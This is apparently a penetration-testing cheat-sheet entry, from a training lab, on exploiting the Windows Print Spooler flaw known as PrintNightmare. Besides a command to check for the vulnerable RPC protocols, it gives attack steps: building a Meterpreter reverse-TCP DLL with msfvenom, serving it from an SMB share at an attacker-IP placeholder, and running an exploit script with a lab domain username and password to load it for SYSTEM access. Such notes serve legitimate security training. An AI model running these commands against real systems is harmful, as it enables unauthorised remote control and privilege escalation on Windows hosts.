# PrinterNightmare - CVE-2021-1675 & 34527 Privilege Escalation

Windows Print Spooler service vulnerability allows remote DLL execution to get SYSTEM. Requires SMB access.

**Check if vulnerable:**

```bash
impacket-rpcdump @192.168.9.160 | egrep 'MS-RPRN|MS-PAR'
Protocol: [MS-RPRN]: Print System Remote Protocol
Protocol: [MS-PAR]: Print System Asynchronous Remote Protocol
```

**Attack steps:**

1. **Prepare DLL:** `msfvenom -p windows/x64/meterpreter/reverse_tcp ... -f dll > mal.dll`
2. **Open SMB share:** `sudo smbserver.py Share mal.dll`
3. **Run exploit:**

```bash
sudo python3 CVE-2021-1675.py inlanefreight.local/forend:Klmcargo2@172.16.5.5 '\\<Attack_IP>\Share\mal.dll'
```
